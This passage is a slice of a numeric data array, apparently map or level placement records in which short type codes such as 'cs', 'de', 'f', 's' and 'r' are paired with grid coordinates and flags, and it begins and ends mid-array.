0, 38, 19, 1], [1, "cs", 2, 37, 11, 1], [1, "cs", 2, 37, 16, 1], [1, "cs", 2, 37, 17, 1], [1, "cs", 2, 38, 18, 1], [1, "cs", 2, 37, 19, 1], [1, "cs", 3, 38, 16, 1], [1, "cs", 0, 37, 21, 1], [1, "cs", 0, 38, 22, 1], [1, "cs", 0, 38, 24, 1], [1, "cs", 2, 37, 20, 1], [1, "cs", 2, 38, 20, 1], [1, "cs", 2, 38, 21, 1], [1, "cs", 1, 37, 23, 1], [1, "cs", 3, 37, 22, 1], [1, "cs", 3, 38, 23, 1], [1, "cs", 2, 37, 24, 1], [1, "cs", 0, 38, 30, 1], [1, "cs", 0, 38, 32, 1], [1, "cs", 0, 37, 31, 1], [1, "cs", 1, 38, 34, 1], [1, "cs", 1, 37, 29, 1], [1, "cs", 2, 38, 29, 1], [1, "cs", 2, 37, 30, 1], [1, "cs", 2, 38, 31, 1], [1, "cs", 2, 37, 32, 1], [1, "cs", 3, 38, 33, 1], [1, "cs", 3, 38, 35, 1], [1, "cs", 2, 37, 33, 1], [1, "cs", 2, 36, 8, 1], [1, "cs", 0, 36, 11, 1], [1, "cs", 0, 35, 9, 1], [1, "cs", 2, 36, 9, 1], [1, "cs", 2, 36, 10, 1], [1, "cs", 2, 35, 10, 1], [1, "cs", 1, 33, 8, 1], [1, "cs", 3, 34, 9, 1], [1, "cs", 3, 35, 8, 1], [1, "cs", 2, 34, 8, 1], [1, "cs", 0, 36, 7, 1], [1, "cs", 1, 34, 7, 1], [1, "cs", 2, 35, 7, 1], [1, "cs", 2, 35, 6, 1], [1, "cs", 2, 36, 6, 1], [1, "cs", 2, 68, 9, 1], [1, "cs", 2, 66, 10, 1], [1, "cs", 3, 66, 9, 1], [1, "cs", 0, 67, 9, 1], [1, "cs", 0, 66, 8, 1], [1, "cs", 2, 67, 8, 1], [1, "cs", 1, 68, 8, 1], [1, "cs", 1, 66, 11, 1], [1, "cs", 2, 67, 10, 1], [1, "cs", 0, 66, 6, 1], [1, "cs", 2, 66, 7, 1], [1, "cs", 2, 67, 7, 1], [1, "cs", 2, 69, 8, 1], [1, "cs", 2, 63, 32, 1], [1, "cs", 2, 62, 34, 1], [1, "cs", 2, 60, 35, 1], [1, "cs", 3, 59, 35, 1], [1, "cs", 0, 61, 35, 1], [1, "cs", 0, 63, 34, 1], [1, "cs", 2, 63, 33, 1], [1, "cs", 2, 63, 35, 1], [1, "cs", 2, 62, 35, 1], [1, "cs", 2, 58, 36, 1], [1, "cs", 1, 59, 36, 1], [1, "cs", 1, 62, 36, 1], [1, "cs", 2, 60, 36, 1], [1, "cs", 2, 61, 34, 1], [1, "cs", 3, 62, 33, 1], [1, "cs", 3, 63, 36, 1], [1, "cs", 3, 61, 36, 1], [1, "cs", 0, 42, 36, 1], [1, "cs", 1, 39, 36, 1], [1, "cs", 2, 41, 36, 1], [1, "cs", 3, 39, 35, 1], [1, "cs", 3, 40, 36, 1], [1, "cs", 3, 43, 36, 1], [1, "cs", 1, 40, 35, 1], [1, "cs", 2, 41, 35, 1], [1, "cs", 2, 40, 34, 1], [1, "cs", 2, 39, 34, 1], [1, "cs", 2, 39, 33, 1], [1, "cs", 2, 39, 32, 1], [1, "cs", 0, 40, 33, 1], [1, "cs", 2, 41, 34, 1], [1, "cs", 1, 44, 36, 1], [1, "cs", 3, 43, 35, 1], [1, "cs", 2, 42, 35, 1], [1, "cs", 0, 37, 34, 1], [1, "cs", 3, 59, 30, 1], [1, "cs", 0, 60, 29, 1], [1, "cs", 2, 60, 28, 1], [1, "cs", 3, 60, 27, 1], [1, "cs", 0, 60, 26, 1], [1, "cs", 2, 54, 25, 1], [1, "cs", 2, 48, 25, 1], [1, "cs", 2, 42, 26, 1], [1, "cs", 0, 55, 25, 1], [1, "cs", 2, 59, 26, 1], [1, "cs", 0, 43, 26, 1], [1, "cs", 1, 42, 27, 1], [1, "cs", 2, 42, 28, 1], [1, "cs", 2, 43, 30, 1], [1, "cs", 0, 42, 29, 1], [1, "cs", 0, 54, 24, 1], [1, "cs", 0, 48, 24, 1], [1, "cs", 2, 54, 23, 1], [1, "cs", 2, 48, 23, 1], [1, "cs", 2, 63, 22, 1], [1, "cs", 2, 63, 21, 1], [1, "cs", 2, 39, 21, 1], [1, "cs", 3, 57, 18, 1], [1, "cs", 2, 56, 18, 1], [1, "cs", 3, 51, 21, 1], [1, "cs", 0, 51, 20, 1], [1, "cs", 2, 51, 19, 1], [1, "cs", 3, 51, 18, 1], [1, "cs", 2, 63, 16, 1], [1, "cs", 2, 63, 10, 1], [1, "cs", 2, 56, 13, 1], [1, "cs", 3, 57, 13, 1], [1, "cs", 1, 45, 18, 1], [1, "cs", 2, 47, 18, 1], [1, "cs", 2, 46, 18, 1], [1, "cs", 0, 46, 13, 1], [1, "cs", 2, 45, 13, 1], [1, "cs", 2, 39, 10, 1], [1, "cs", 2, 39, 16, 1], [1, "cs", 2, 47, 17, 1], [1, "a", 0, 51, 15, 1], [1, "a", 1, 53, 14, 1], [1, "a", 1, 49, 14, 1], [1, "de", 8, 55, 15, 0], [1, "de", 9, 48, 28, 0], [1, "de", 10, 58, 26, 0], [1, "de", 11, 59, 29, 0], [1, "de", 11, 55, 34, 0], [1, "de", 10, 48, 33, 0], [1, "de", 9, 41, 32, 0], [1, "de", 9, 56, 24, 0], [1, "de", 9, 62, 16, 0], [1, "de", 9, 45, 11, 0], [1, "de", 9, 44, 17, 0], [1, "de", 10, 44, 13, 0], [1, "de", 10, 58, 13, 0], [1, "de", 10, 63, 31, 0], [1, "de", 8, 60, 30, 0], [1, "de", 8, 43, 26, 0], [1, "de", 10, 43, 29, 0], [1, "de", 10, 53, 29, 0], [1, "de", 10, 53, 24, 0], [1, "de", 9, 53, 19, 0], [1, "de", 11, 49, 19, 0], [1, "de", 10, 39, 26, 0], [1, "de", 9, 46, 24, 0], [1, "de", 9, 62, 10, 0], [1, "de", 8, 40, 14, 0], [1, "de", 32, 55, 35, 0], [1, "de", 32, 60, 33, 0], [1, "de", 32, 63, 28, 0], [1, "de", 32, 63, 24, 0], [1, "de", 32, 58, 22, 0], [1, "de", 32, 59, 17, 0], [1, "de", 32, 63, 13, 0], [1, "de", 32, 59, 10, 0], [1, "de", 32, 56, 12, 0], [1, "de", 32, 52, 17, 0], [1, "de", 32, 51, 14, 0], [1, "de", 32, 39, 12, 0], [1, "de", 32, 39, 18, 0], [1, "de", 32, 41, 25, 0], [1, "de", 32, 39, 30, 0], [1, "de", 32, 50, 29, 0], [1, "de", 32, 43, 34, 0], [1, "de", 32, 47, 34, 0], [1, "de", 31, 54, 33, 0], [1, "de", 31, 59, 24, 0], [1, "de", 31, 63, 19, 0], [1, "de", 31, 47, 15, 0], [1, "de", 31, 43, 17, 0], [1, "de", 31, 39, 27, 0], [1, "de", 31, 48, 27, 0], [1, "de", 31, 57, 27, 0], [1, "de", 32, 44, 27, 0], [1, "d", 0, 12, 13, 1], [1, "d", 0, 89, 13, 1], [1, "d", 1, 91, 21, 1], [1, "d", 1, 10, 22, 1], [1, "f", 2, 89, 18, 1], [1, "f", 0, 88, 19, 1], [1, "g", 1, 85, 22, 1], [1, "s", 1, 90, 29, 1], [1, "s", 1, 92, 15, 1], [1, "s", 0, 91, 31, 1], [1, "s", 2, 90, 38, 1], [1, "s", 0, 91, 42, 1], [1, "s", 0, 90, 49, 1], [1, "f", 1, 86, 43, 1], [1, "f", 0, 81, 45, 1], [1, "f", 2, 66, 44, 1], [1, "f", 2, 55, 49, 1], [1, "f", 1, 54, 50, 1], [1, "f", 2, 43, 45, 1], [1, "f", 2, 31, 48, 1], [1, "f", 1, 27, 39, 1], [1, "f", 1, 80, 46, 1], [1, "f", 1, 69, 48, 1], [1, "g", 0, 80, 40, 1], [1, "g", 2, 81, 40, 1], [1, "s", 2, 77, 39, 1], [1, "s", 0, 68, 43, 1], [1, "s", 2, 57, 41, 1], [1, "s", 1, 56, 42, 1], [1, "s", 1, 40, 41, 1], [1, "s", 2, 48, 48, 1], [1, "f", 2, 17, 12, 1], [1, "f", 0, 13, 31, 1], [1, "f", 1, 14, 32, 1], [1, "s", 0, 15, 27, 1], [1, "s", 0, 13, 39, 1], [1, "f", 2, 11, 17, 1], [1, "f", 1, 12, 18, 1], [1, "g", 2, 12, 25, 1], [1, "f", 0, 16, 45, 1], [1, "f", 1, 17, 46, 1], [1, "s", 1, 74, 48, 1], [1, "s", 1, 20, 47, 1], [1, "g", 0, 58, 59, 1], [1, "g", 0, 46, 72, 1], [1, "g", 0, 69, 79, 1], [1, "g", 0, 72, 74, 1], [1, "g", 0, 26, 88, 1], [1, "g", 0, 20, 74, 1], [1, "g", 0, 28, 67, 1], [1, "g", 0, 49, 86, 1], [1, "g", 0, 77, 90, 1], [1, "g", 0, 87, 72, 1], [1, "g", 0, 14, 85, 1], [1, "g", 1, 85, 97, 1], [1, "g", 1, 68, 104, 1], [1, "g", 1, 63, 91, 1], [1, "g", 1, 39, 90, 1], [1, "g", 1, 34, 99, 1], [1, "g", 1, 17, 103, 1], [1, "g", 2, 77, 60, 1], [1, "g", 2, 19, 56, 1], [1, "g", 2, 39, 60, 1], [1, "g", 2, 87, 57, 1], [1, "f", 0, 9, 62, 1], [1, "f", 0, 12, 81, 1], [1, "f", 0, 26, 59, 1], [1, "f", 0, 35, 53, 1], [1, "f", 0, 44, 58, 1], [1, "f", 0, 88, 62, 1], [1, "f", 0, 91, 82, 1], [1, "f", 0, 84, 85, 1], [1, "f", 0, 79, 69, 1], [1, "f", 0, 64, 71, 1], [1, "f", 0, 62, 83, 1], [1, "f", 0, 34, 81, 1], [1, "f", 0, 39, 71, 1], [1, "f", 0, 54, 94, 1], [1, "f", 1, 81, 70, 1], [1, "f", 1, 91, 72, 1], [1, "f", 1, 8, 91, 1], [1, "f", 1, 14, 81, 1], [1, "f", 1, 29, 79, 1], [1, "f", 1, 13, 65, 1], [1, "f", 1, 46, 97, 1], [1, "f", 1, 43, 73, 1], [1, "f", 1, 60, 69, 1], [1, "f", 1, 70, 96, 1], [1, "f", 1, 58, 84, 1], [1, "s", 1, 56, 76, 1], [1, "s", 1, 85, 74, 1], [1, "s", 0, 72, 71, 1], [1, "s", 0, 41, 62, 1], [1, "s", 0, 60, 61, 1], [1, "s", 0, 20, 66, 1], [1, "s", 0, 47, 83, 1], [1, "s", 0, 29, 86, 1], [1, "s", 0, 78, 92, 1], [1, "s", 0, 62, 102, 1], [1, "s", 0, 18, 95, 1], [1, "s", 2, 64, 101, 1], [1, "s", 2, 78, 84, 1], [1, "s", 2, 49, 83, 1], [1, "s", 2, 15, 76, 1], [1, "s", 2, 21, 84, 1], [1, "f", 1, 26, 94, 1], [1, "f", 2, 23, 96, 1], [1, "f", 2, 25, 72, 1], [1, "f", 2, 85, 77, 1], [1, "f", 2, 79, 95, 1], [1, "f", 2, 51, 65, 1], [1, "f", 2, 69, 60, 1], [1, "f", 1, 25, 105, 1], [1, "s", 1, 18, 68, 1], [1, "s", 0, 55, 76, 1], [1, "s", 0, 74, 59, 1], [1, "f", 1, 46, 142, 1], [1, "f", 1, 19, 140, 1], [1, "f", 1, 77, 137, 1], [1, "f", 0, 75, 137, 1], [1, "f", 0, 55, 138, 1], [1, "f", 0, 33, 127, 1], [1, "f", 0, 76, 121, 1], [1, "f", 0, 55, 121, 1], [1, "f", 0, 13, 123, 1], [1, "f", 0, 18, 141, 1], [1, "f", 0, 40, 137, 1], [1, "f", 2, 76, 142, 1], [1, "f", 2, 57, 140, 1], [1, "f", 2, 39, 138, 1], [1, "f", 2, 16, 143, 1], [1, "f", 2, 29, 131, 1], [1, "f", 0, 70, 150, 1], [1, "f", 0, 28, 146, 1], [1, "f", 0, 12, 132, 1], [1, "f", 0, 90, 129, 1], [1, "f", 1, 87, 131, 1], [1, "f", 0, 91, 143, 1], [1, "f", 2, 87, 145, 1], [1, "f", 1, 89, 141, 1], [1, "f", 1, 63, 130, 1], [1, "f", 1, 75, 122, 1], [1, "f", 1, 52, 124, 1], [1, "f", 1, 34, 127, 1], [1, "f", 1, 14, 123, 1], [1, "f", 1, 24, 122, 1], [1, "f", 0, 83, 108, 1], [1, "f", 0, 89, 118, 1], [1, "f", 0, 56, 107, 1], [1, "f", 0, 38, 113, 1], [1, "f", 0, 16, 110, 1], [1, "f", 1, 80, 105, 1], [1, "f", 1, 82, 109, 1], [1, "f", 1, 87, 118, 1], [1, "f", 1, 59, 110, 1], [1, "f", 1, 29, 111, 1], [1, "f", 2, 28, 112, 1], [1, "f", 2, 70, 112, 1], [1, "f", 2, 42, 111, 1], [1, "s", 0, 68, 157, 1], [1, "s", 0, 81, 158, 1], [1, "s", 0, 25, 172, 1], [1, "s", 0, 22, 161, 1], [1, "s", 0, 35, 152, 1], [1, "s", 0, 66, 144, 1], [1, "s", 0, 87, 145, 1], [1, "s", 0, 86, 145, 1], [1, "s", 0, 84, 135, 1], [1, "s", 0, 69, 133, 1], [1, "s", 0, 84, 122, 1], [1, "s", 0, 68, 121, 1], [1, "s", 0, 48, 124, 1], [1, "s", 0, 26, 129, 1], [1, "s", 0, 9, 127, 1], [1, "s", 0, 11, 144, 1], [1, "s", 0, 9, 109, 1], [1, "s", 0, 35, 101, 1], [1, "s", 0, 47, 109, 1], [1, "s", 0, 58, 111, 1], [1, "s", 0, 84, 110, 1], [1, "s", 0, 28, 114, 1], [1, "s", 1, 30, 116, 1], [1, "s", 1, 46, 112, 1], [1, "s", 1, 81, 111, 1], [1, "s", 1, 70, 123, 1], [1, "s", 1, 49, 127, 1], [1, "s", 1, 66, 134, 1], [1, "s", 1, 67, 144, 1], [1, "s", 1, 38, 152, 1], [1, "s", 1, 21, 164, 1], [1, "s", 1, 12, 147, 1], [1, "s", 1, 24, 130, 1], [1, "s", 1, 12, 125, 1], [1, "s", 1, 65, 158, 1], [1, "s", 1, 83, 167, 1], [1, "s", 1, 65, 167, 1], [1, "s", 1, 47, 164, 1], [1, "s", 1, 56, 168, 1], [1, "s", 2, 54, 169, 1], [1, "s", 2, 88, 170, 1], [1, "s", 2, 91, 162, 1], [1, "s", 2, 79, 149, 1], [1, "s", 2, 75, 144, 1], [1, "s", 2, 57, 150, 1], [1, "s", 2, 47, 143, 1], [1, "s", 2, 31, 145, 1], [1, "s", 2, 36, 138, 1], [1, "s", 2, 10, 163, 1], [1, "s", 2, 22, 142, 1], [1, "g", 2, 78, 132, 1], [1, "g", 1, 48, 135, 1], [1, "g", 2, 16, 136, 1], [1, "g", 0, 62, 92, 1], [1, "g", 2, 70, 80, 1], [1, "g", 2, 15, 86, 1], [1, "g", 2, 47, 75, 1], [1, "g", 2, 36, 89, 1], [1, "g", 2, 80, 90, 1], [1, "f", 1, 39, 118, 1], [1, "d", 2, 84, 54, 1], [1, "d", 2, 16, 54, 1], [1, "de", 7, 13, 13, 0], [1, "de", 5, 16, 28, 0], [1, "de", 5, 9, 25, 0], [1, "de", 5, 34, 41, 0], [1, "de", 4, 28, 40, 0], [1, "de", 6, 31, 47, 0], [1, "de", 6, 12, 39, 0], [1, "de", 4, 16, 47, 0], [1, "de", 4, 7, 46, 0], [1, "de", 6, 7, 33, 0], [1, "de", 6, 40, 42, 0], [1, "de", 7, 20, 48, 0], [1, "de", 7, 29, 59, 0], [1, "de", 6, 27, 58, 0], [1, "de", 6, 15, 54, 0], [1, "de", 5, 12, 66, 0], [1, "de", 5, 37, 53, 0], [1, "de", 4, 10, 63, 0], [1, "de", 7, 49, 48, 0], [1, "de", 7, 37, 63, 0], [1, "de", 6, 33, 68, 0], [1, "de", 6, 56, 52, 0], [1, "de", 5, 59, 58, 0], [1, "de", 6, 48, 58, 0], [1, "de", 4, 53, 63, 0], [1, "de", 4, 67, 44, 0], [1, "de", 5, 70, 49, 0], [1, "de", 5, 82, 55, 0], [1, "de", 5, 79, 41, 0], [1, "de", 5, 91, 29, 0], [1, "de", 7, 91, 43, 0], [1, "de", 6, 85, 44, 0], [1, "de", 6, 74, 60, 0], [1, "de", 6, 90, 8, 0], [1, "de", 5, 91, 15, 0], [1, "de", 4, 87, 20, 0], [1, "de", 7, 93, 11, 0], [1, "de", 6, 91, 21, 0], [1, "de", 6, 85, 35, 0], [1, "de", 5, 93, 58, 0], [1, "de", 5, 87, 63, 0], [1, "de", 7, 77, 62, 0], [1, "de", 6, 68, 61, 0], [1, "de", 5, 90, 73, 0], [1, "de", 4, 87, 71, 0], [1, "de", 7, 80, 71, 0], [1, "de", 7, 83, 77, 0], [1, "de", 7, 89, 83, 0], [1, "de", 4, 71, 80, 0], [1, "de", 4, 71, 70, 0], [1, "de", 5, 63, 72, 0], [1, "de", 4, 54, 75, 0], [1, "de", 5, 44, 83, 0], [1, "de", 5, 42, 74, 0], [1, "de", 5, 15, 81, 0], [1, "de", 4, 29, 80, 0], [1, "de", 4, 37, 90, 0], [1, "de", 4, 7, 75, 0], [1, "de", 6, 22, 74, 0], [1, "de", 6, 43, 95, 0], [1, "de", 6, 57, 85, 0], [1, "de", 6, 19, 94, 0], [1, "de", 6, 9, 92, 0], [1, "de", 5, 26, 89, 0], [1, "de", 5, 31, 112, 0], [1, "de", 5, 54, 108, 0], [1, "de", 5, 55, 95, 0], [1, "de", 5, 35, 104, 0], [1, "de", 5, 13, 110, 0], [1, "de", 7, 27, 107, 0], [1, "de", 7, 47, 99, 0], [1, "de", 7, 11, 104, 0], [1, "de", 7, 9, 111, 0], [1, "de", 7, 40, 114, 0], [1, "de", 7, 28, 117, 0], [1, "de", 7, 47, 113, 0], [1, "de", 7, 63, 104, 0], [1, "de", 4, 64, 92, 0], [1, "de", 6, 86, 97, 0], [1, "de", 5, 76, 91, 0], [1, "de", 5, 85, 86, 0], [1, "de", 6, 78, 83, 0], [1, "de", 6, 71, 97, 0], [1, "de", 4, 69, 105, 0], [1, "de", 4, 79, 104, 0], [1, "de", 4, 86, 109, 0], [1, "de", 4, 86, 118, 0], [1, "de", 5, 70, 113, 0], [1, "de", 6, 69, 121, 0], [1, "de", 6, 76, 122, 0], [1, "de", 7, 87, 130, 0], [1, "de", 4, 84, 123, 0], [1, "de", 4, 57, 121, 0], [1, "de", 5, 53, 125, 0], [1, "de", 5, 62, 131, 0], [1, "de", 6, 67, 143, 0], [1, "de", 5, 77, 143, 0], [1, "de", 5, 85, 136, 0], [1, "de", 6, 87, 147, 0], [1, "de", 6, 92, 140, 0], [1, "de", 4, 93, 127, 0], [1, "de", 5, 93, 106, 0], [1, "de", 5, 45, 144, 0], [1, "de", 4, 41, 139, 0], [1, "de", 4, 54, 138, 0], [1, "de", 6, 29, 145, 0], [1, "de", 6, 29, 132, 0], [1, "de", 6, 35, 127, 0], [1, "de", 6, 64, 142, 0], [1, "de", 5, 23, 131, 0], [1, "de", 5, 9, 134, 0], [1, "de", 6, 11, 121, 0], [1, "de", 4, 26, 121, 0], [1, "de", 35, 58, 150, 0], [1, "de", 33, 48, 156, 0], [1, "de", 33, 25, 158, 0], [1, "de", 33, 36, 154, 0], [1, "de", 34, 9, 154, 0], [1, "de", 34, 13, 148, 0], [1, "de", 34, 21, 142, 0], [1, "de", 34, 38, 139, 0], [1, "de", 34, 47, 144, 0], [1, "de", 34, 68, 142, 0], [1, "de", 36, 70, 135, 0], [1, "de", 36, 64, 132, 0], [1, "de", 36, 86, 134, 0], [1, "de", 36, 90, 141, 0], [1, "de", 36, 93, 131, 0], [1, "de", 36, 91, 125, 0], [1, "de", 36, 76, 123, 0], [1, "de", 33, 82, 122, 0], [1, "de", 35, 56, 122, 0], [1, "de", 35, 40, 119, 0], [1, "de", 35, 17, 112, 0], [1, "de", 35, 37, 102, 0], [1, "de", 33, 18, 97, 0], [1, "de", 34, 10, 83, 0], [1, "de", 33, 19, 73, 0], [1, "de", 33, 10, 60, 0], [1, "de", 35, 24, 60, 0], [1, "de", 36, 14, 45, 0], [1, "de", 36, 21, 42, 0], [1, "de", 35, 8, 32, 0], [1, "de", 33, 9, 24, 0], [1, "de", 35, 35, 27, 0], [1, "de", 33, 56, 35, 0], [1, "de", 36, 53, 36, 0], [1, "de", 33, 45, 35, 0], [1, "de", 35, 53, 39, 0], [1, "de", 36, 57, 30, 0], [1, "de", 33, 86, 108, 0], [1, "de", 33, 68, 112, 0], [1, "de", 33, 49, 109, 0], [1, "de", 33, 46, 95, 0], [1, "de", 33, 90, 76, 0], [1, "de", 36, 76, 83, 0], [1, "de", 36, 70, 72, 0], [1, "de", 36, 78, 63, 0], [1, "de", 36, 90, 64, 0], [1, "de", 36, 60, 70, 0], [1, "de", 35, 75, 90, 0], [1, "de", 35, 81, 58, 0], [1, "de", 35, 91, 51, 0], [1, "de", 35, 93, 56, 0], [1, "de", 35, 61, 60, 0], [1, "de", 35, 66, 46, 0], [1, "de", 33, 90, 19, 0], [1, "de", 34, 92, 9, 0], [1, "de", 35, 75, 39, 0], [1, "de", 35, 67, 42, 0], [1, "de", 35, 93, 37, 0], [1, "de", 36, 89, 28, 0], [1, "de", 36, 42, 61, 0], [1, "de", 33, 49, 50, 0], [1, "de", 33, 44, 75, 0], [1, "de", 33, 46, 85, 0], [1, "de", 33, 64, 84, 0], [1, "de", 33, 56, 94, 0], [1, "de", 33, 25, 90, 0], [1, "de", 33, 31, 69, 0], [1, "de", 35, 34, 54, 0], [1, "de", 35, 29, 47, 0], [1, "de", 36, 42, 41, 0], [1, "de", 36, 29, 34, 0], [1, "de", 35, 20, 55, 0], [1, "de", 35, 14, 52, 0], [1, "s", 2, 12, 171, 1], [1, "r", 20, 188, 0], [1, "r", 21, 188, 0], [1, "r", 22, 188, 0], [1, "r", 23, 188, 0], [1, "r", 24, 188, 0], [1, "r", 25, 189, 0], [1, "r", 24, 189, 0], [1, "r", 23, 189, 0], [1, "r", 22, 189, 0], [1, "r", 21, 189, 0], [1, "r", 20, 189, 0], [1, "r", 19, 189, 0], [1, "r", 19, 190, 0], [1, "r", 19, 191, 0], [1, "r", 20, 191, 0], [1, "r", 21, 191, 0], [1, "r", 22, 191, 0], [1, "r", 24, 191, 0], [1, "r", 23, 191, 0], [1, "r", 25, 191, 0], [1, "r", 25, 190, 0], [1, "r", 24, 190, 0], [1, "r", 23, 190, 0], [1, "r", 22, 190, 0], [1, "r", 21, 190, 0], [1, "r", 20, 190, 0], [1, "r", 26, 190, 0], [1, "r", 26, 191, 0], [1, "r", 24, 193, 0], [1, "r", 23, 193, 0], [1, "r", 22, 193, 0], [1, "r", 20, 192, 0], [1, "r", 21, 192, 0], [1, "r", 22, 192, 0], [1, "r", 23, 192, 0], [1, "r", 24, 192, 0], [1, "r", 25, 192, 0], [1, "r", 53, 199, 0], [1, "r", 52, 200, 0], [1, "r", 54, 199, 0], [1, "r", 55, 199, 0], [1, "r", 55, 200, 0], [1, "r", 54, 200, 0], [1, "r", 53, 200, 0], [1, "r", 51, 200, 0], [1, "r", 56, 200, 0], [1, "r", 55, 201, 0], [1, "r", 54, 201, 0], [1, "r", 55, 202, 0], [1, "r", 54, 203, 0], [1, "r", 54, 204, 0], [1, "r", 54, 202, 0], [1, "r", 53, 202, 0], [1, "r", 52, 202, 0], [1, "r", 53, 201, 0], [1, "r", 52, 201, 0], [1, "r", 51, 201, 0], [1, "r", 51, 202, 0], [1, "r", 50, 202, 0], [1, "r", 50, 201, 0], [1, "r", 56, 201, 0], [1, "r", 53, 203, 0], [1, "r", 52, 203, 0], [1, "r", 51, 203, 0], [1, "r", 56, 202, 0], [1, "r", 55, 203, 0], [1, "r", 53, 204, 0], [1, "r", 52, 204, 0], [1, "r", 55, 204, 0], [1, "r", 56, 203, 0], [1, "r", 56, 244, 0], [1, "r", 54, 246, 0], [1, "r", 50, 248, 0], [1, "r", 48, 248, 0], [1, "r", 43, 248, 0], [1, "r", 45, 238, 0], [1, "r", 44, 238, 0], [1, "r", 43, 238, 0], [1, "r", 46, 238, 0], [1, "r", 47, 238, 0], [1, "r", 48, 238, 0], [1, "r", 49, 238, 0], [1, "r", 50, 238, 0], [1, "r", 51, 238, 0], [1, "r", 52, 238, 0], [1, "r", 53, 238, 0], [1, "r", 54, 239, 0], [1, "r", 53, 240, 0], [1, "r", 53, 239, 0], [1, "r", 52, 239, 0], [1, "r", 51, 239, 0], [1, "r", 50, 239, 0], [1, "r", 49, 239, 0], [1, "r", 48, 239, 0], [1, "r", 47, 239, 0], [1, "r", 46, 239, 0], [1, "r", 45, 239, 0], [1, "r", 44, 239, 0], [1, "r", 43, 239, 0], [1, "r", 42, 239, 0], [1, "r", 41, 240, 0], [1, "r", 42, 240, 0], [1, "r", 43, 240, 0], [1, "r", 44, 240, 0], [1, "r", 45, 240, 0], [1, "r", 46, 240, 0], [1, "r", 47, 240, 0], [1, "r", 48, 240, 0], [1, "r", 49, 240, 0], [1, "r", 50, 240, 0], [1, "r", 51, 240, 0], [1, "r", 52, 240, 0], [1, "r", 54, 240, 0], [1, "r", 55, 240, 0], [1, "r", 56, 241, 0], [1, "r", 55, 241, 0], [1, "r", 54, 241, 0], [1, "r", 53, 241, 0], [1, "r", 52, 241, 0], [1, "r", 51, 241, 0], [1, "r", 49, 241, 0], [1, "r", 50, 241, 0], [1, "r", 48, 241, 0], [1, "r", 47, 241, 0], [1, "r", 46, 241, 0], [1, "r", 45, 241, 0], [1, "r", 44, 241, 0], [1, "r", 43, 241, 0], [1, "r", 42, 241, 0], [1, "r", 41, 241, 0], [1, "r", 40, 242, 0], [1, "r", 41, 242, 0], [1, "r", 42, 242, 0], [1, "r", 43, 242, 0], [1, "r", 44, 242, 0], [1, "r", 45, 242, 0], [1, "r", 46, 242, 0], [1, "r", 47, 242, 0], [1, "r", 48, 242, 0], [1, "r", 49, 242, 0], [1, "r", 50, 242, 0], [1, "r", 51, 242, 0], [1, "r", 52, 242, 0], [1, "r", 53, 242, 0], [1, "r", 54, 242, 0], [1, "r", 55, 242, 0], [1, "r", 56, 242, 0], [1, "r", 56, 243, 0], [1, "r", 55, 243, 0], [1, "r", 54, 243, 0], [1, "r", 53, 243, 0], [1, "r", 52, 243, 0], [1, "r", 51, 243, 0], [1, "r", 50, 243, 0], [1, "r", 49, 243, 0], [1, "r", 48, 243, 0], [1, "r", 47, 243, 0], [1, "r", 46, 243, 0], [1, "r", 45, 243, 0], [1, "r", 44, 243, 0], [1, "r", 43, 243, 0], [1, "r", 42, 243, 0], [1, "r", 41, 243, 0], [1, "r", 40, 243, 0], [1, "r", 40, 244, 0], [1, "r", 41, 244, 0], [1, "r", 43, 244, 0], [1, "r", 44, 244, 0], [1, "r", 45, 244, 0], [1, "r", 46, 244, 0], [1, "r", 47, 244, 0], [1, "r", 48, 244, 0], [1, "r", 49, 244, 0], [1, "r", 50, 244, 0], [1, "r", 51, 244, 0], [1, "r", 52, 244, 0], [1, "r", 53, 244, 0], [1, "r", 54, 244, 0], [1, "r", 55, 244, 0], [1, "r", 42, 244, 0], [1, "r", 40, 245, 0], [1, "r", 41, 245, 0], [1, "r", 42, 245, 0], [1, "r", 43, 245, 0], [1, "r", 44, 245, 0], [1, "r", 45, 245, 0], [1, "r", 46, 245, 0], [1, "r", 47, 245, 0], [1, "r", 48, 245, 0], [1, "r", 49, 245, 0], [1, "r", 50, 245, 0], [1, "r", 51, 245, 0], [1, "r", 52, 246, 0], [1, "r", 52, 245, 0], [1, "r", 53, 245, 0], [1, "r", 54, 245, 0], [1, "r", 55, 245, 0], [1, "r", 53, 246, 0], [1, "r", 51, 246, 0], [1, "r", 50, 246, 0], [1, "r", 49, 246, 0], [1, "r", 48, 246, 0], [1, "r", 47, 246, 0], [1, "r", 45, 246, 0], [1, "r", 46, 246, 0], [1, "r", 44, 246, 0], [1, "r", 43, 246, 0], [1, "r", 42, 246, 0], [1, "r", 41, 246, 0], [1, "r", 42, 247, 0], [1, "r", 43, 247, 0], [1, "r", 44, 247, 0], [1, "r", 45, 247, 0], [1, "r", 46, 247, 0], [1, "r", 47, 247, 0], [1, "r", 48, 247, 0], [1, "r", 50, 247, 0], [1, "r", 51, 247, 0], [1, "r", 52, 247, 0], [1, "r", 53, 247, 0], [1, "r", 54, 247, 0], [1, "r", 49, 247, 0], [1, "r", 49, 248, 0], [1, "r", 47, 248, 0], [1, "r", 46, 248, 0], [1, "r", 45, 248, 0], [1, "r", 51, 248, 0], [1, "r", 55, 246, 1], [1, "r", 55, 247, 1], [1, "r", 56, 247, 1], [1, "r", 56, 248, 1], [1, "r", 95, 270, 1], [1, "r", 93, 270, 1], [1, "r", 94, 270, 1], [1, "r", 95, 271, 1], [1, "r", 94, 271, 1], [1, "r", 93, 271, 1], [1, "r", 94, 282, 1], [1, "r", 93, 282, 1], [1, "r", 93, 281, 1], [1, "r", 92, 281, 1], [1, "r", 92, 280, 1], [1, "r", 91, 280, 1], [1, "r", 90, 279, 1], [1, "r", 95, 275, 1], [1, "r", 95, 274, 1], [1, "r", 95, 273, 1], [1, "r", 95, 272, 1], [1, "r", 94, 274, 1], [1, "r", 94, 273, 1], [1, "r", 94, 272, 1], [1, "r", 93, 272, 1], [1, "r", 93, 273, 1], [1, "r", 93, 274, 1], [1, "r", 92, 273, 1], [1, "r", 92, 272, 1], [1, "r", 92, 270, 1], [1, "r", 92, 271, 1], [1, "r", 92, 269, 1], [1, "r", 90, 269, 1], [1, "r", 91, 269, 1], [1, "r", 91, 271, 1], [1, "r", 91, 270, 1], [1, "r", 95, 278, 1], [1, "r", 95, 277, 1], [1, "r", 95, 276, 1], [1, "r", 94, 276, 1], [1, "r", 94, 275, 1], [1, "r", 93, 275, 1], [1, "r", 92, 274, 1], [1, "r", 92, 275, 1], [1, "r", 91, 275, 1], [1, "r", 90, 275, 1], [1, "r", 89, 274, 1], [1, "r", 90, 274, 1], [1, "r", 89, 275, 1], [1, "r", 88, 274, 1], [1, "r", 88, 